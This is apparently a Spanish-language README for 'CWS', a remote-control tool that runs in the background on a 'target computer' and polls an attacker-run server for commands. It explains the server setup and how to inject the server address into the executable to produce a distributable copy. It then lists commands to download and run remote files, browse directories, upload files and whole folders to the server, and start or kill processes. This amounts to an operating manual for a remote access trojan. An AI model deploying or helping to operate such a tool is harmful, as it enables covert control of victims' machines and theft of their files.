# CWS
A software waiting for commands. Like ...

## Creando el Servidor
CWS necesita de un servidor FTP para poder funcionar.
CWS.exe (desde ahora CWScli) es el ejecutable que se estara en segundo plano en el computador objetivo.
Una vez alli, CWScli comenzara su trabajo, pero antes es necesario poner el servidor en marcha.

Es muy facil hacer que todo funcione.

### Estructura obligatoria
CWScli tiene una estructura pre-definida en su codigo, solo falta que tu copies esta estructura en tu servidor.
Con estructura me refiero a que los archivos, rutas y carpetas deben estar de cierta forma dentro de tu servidor.

1. En un directorio principal. Deberas crear las siguientes carpetas:
  * CWS
  * Dentro de la carpeta CWS deberas crear una carpeta llamada Users
2. Dentro de la carpeta CWS. Deberas poner los siguientes archivos:
  * ReportIt.php
  * cliResponse.php
  * fileUpload.php
  * Opcionalmente puedes poner createFolder.php. Aunque este no se utiliza.
Tambien deberas editar el archivo ``General.ini``:
Dentro de este deberas poner ciertos valores:
Las lineas con "[]" no las puedes editar.
Campos:
``IsEnabled=True``: True/False. Si CWScli esta disponible para funcionar. De estar en false todos los CWScli dejaran de funcionar.
``IsReading=True``: True/False. Si CWScli debe hacer caso a este archivo. De estar en false todos los CWScli dejaran de funcionar.
``Name=CWS``: Nombre del programa. En este caso se llama CWS. No editar ni modificar.
``Version=1.1.0.0``: Version actual de CWS. Si se publica una nueva release, deberas subir un .zip con la nueva version de CWS.exe al servidor. Luego deberas editar este campo con la version correspondiente.
``Download=null``: Link de descarga directo del .zip con el CWS.exe. Si hay una nueva version, es esto lo que CWScli descargara para luego instalar.
``HostDomain=null``: Dominio. Es el link del servidor al que responde. Pone aqui tu el link a tu servidor.
``GeneralConfigFileReaderTimeout=60000``: Numero. Cada cuanto tiempo se leera este archivo.
``PrivateConfigFileReaderTimeout=60000``: Numero. Cada cuanto tiempo vera por modificaciones en el archivo de control por usuario. (En resumen: cada cuanto tiempo vera por nuevos comandos)
Luego de editarlo, subelo al servidor dentro de la carpeta CWS.
3. Listo. El Servidor ya esta configurado.
Un ejemplo del como deberia quedar es:
Ejemplo:
    Siendo HostDomain=http://mi-dominio.com
    http://mi-dominio.com/CWS
    http://mi-dominio.com/CWS/Users
    http://mi-dominio.com/CWS/ReportIt.php
    http://mi-dominio.com/CWS/cliResponse.php
    http://mi-dominio.com/CWS/fileUpload.php
    http://mi-dominio.com/CWS/General.ini

## Inyectando tu Servidor
CWScli no funcionara si no sabe a que servidor servir. Debes inyectar el link de tu servidor dentro de CWS.exe para qui este funcione.
La inyeccion debe hacerse con CWS Control.exe

1. Dentro de CWS Contro.exe debes dirigirte a la pestaña "Injector".
2. En el campo "Ruta ejecutable" lo dejas en blanco xD.
3. En el campo "HostDomain" debes poner tu servidor. Ejemplo: http://mi-dominio.com <- tal cual. "http://mi-dominio.com/" no sirve. debe ser sin el / final.
4. Una vez completado eso. Clic en el boton "INYECTAR" y te pedira que selecciones CWS.exe para poder escribir dentro de el el HostDomain.
5. Listo. Un mensaje aparecera confirmando la accion. El nuevo CWS.exe generado es el que se puede distribuir.

## Controlando
Todos los computadores que tengan CWS.exe ejecutandose podran ser controlados.
Basta con ver la lista de comandos:
* /Network.DownloadComponent=<url>, <fileName>, <isCompressed>, <RunLater>, <mainFileName>, <Parameter>
  url: link de descarga directo de algun complemento. (a un ejecutable, un comprimido, imagen o archivo de texto, etc)
  fileName: El nombre que recibira el archivo descargado dentro del computador. (si la url conduce a descargar "hola.zip" tendras que poner ese nombre junto a su extencion (hola.zip))
  isCompressed: True/False. Si el archivo que se descargo es un .zip, entonces deberas poner True. Si es otro tipo de archivo (ejemplo: una imagen, archivo de texto, ejecutable,e tc) entonces pone False.
  mainFileName: Es el nombre del archivo principal. Si el .zip contiene un archivo llamado Hola.exe, entonces pone aqui Hola.exe. Asi CWScli sabra que archivo debe ejecutar en caso de que RunLater este en True.
  RunLater: True/False. Si quieres que el archivo descargado se inicie debes poner True, si no quieres que se inicie, pone False. No es necesario que sea un .exe. Realmente si pones True, cualquier archivo iniciara. Sea una imagen (iniciara con la aplicacion Fotos) o un archivo de texto (iniciara con Bloc de notas) y asi.
  Parameters: Si es un ejecutable podras poner parametros para que este inicie. Si no es un ejecutable entonces pon "null".
* /FileSystem.GetFiles=<ruta_directorio>
  ruta_directorio: La ruta a la cual se listaran todos los archivos. Ejemplo: C:\Users\Zhenboro\Desktop. Eso devolvera todas las rutas de los archivo dentro de esta.
* /FileSystem.GetDirectories=<ruta_directorio>
  ruta_directorio: La ruta a la cual se listaran todas las carpetas. Ejemplo: C:\Program Files. Eso devolvera todas las rutas de las carpetas dentro de esta.
* /Network.GetFile=<ruta_archivo>
  ruta_archivo: Ruta del archivo que quieres se suba al servidor. Ejemplo: C:\Users\Zhenboro\Desktop\Registros.docx este archivo Registros.docx se subira al servidor y lo podras ver. (Cuiado: Si el archivo es muy grande podria dañarse mientras se sube. Tambien ten encuenta que algunos servicios de hosting no permiten subidas de ciertos tipos de archivo)
* /Network.GetFolder=<ruta_directorio>
  ruta_directorio: Ruta del directorio que quieres se suba al servidor. Ejemplo: C:\Users\Zhenboro\Desktop todos los archivos y carpetas dentro de la carpeta Desktop seran comprimidos en un .zip y luego este se subira al servidor. (Cuidado: Si el hay muchos archivos, el .zip podria no subirse. Tambien ten en cuenta que algunos servicios de host no permiten la subida de archivos .zip)
* /Process.Start=<ruta_archivo>, <Parameter>
  ruta_archivo: Indica la ruta del archivo que quires iniciar. Puede ser un archivo de texto, imagen, etc. Ejemplo: C:\Users\Zhenboro\Desktop\programa.exe o winword.exe (sin indicar la ruta, Microsoft Word puede ser iniciado sin indicar la ruta, tambien pasa con, por ejemplo, cmd.exe, firefox.exe, etc...). Incluso mostrar una pagina web (msedge.exe,http://midominio.com)
  Parameter: Si es un ejecutable, podras pasar parametros. Si no, dejalo vacio.
* /Process.Stop=<nombre_proceso>
  nombre_proceso: Nombre del programa a cerrar. Ejemplo: winword (sin extencion)
* /Stop
  Detiene la instancia de CWS.exe
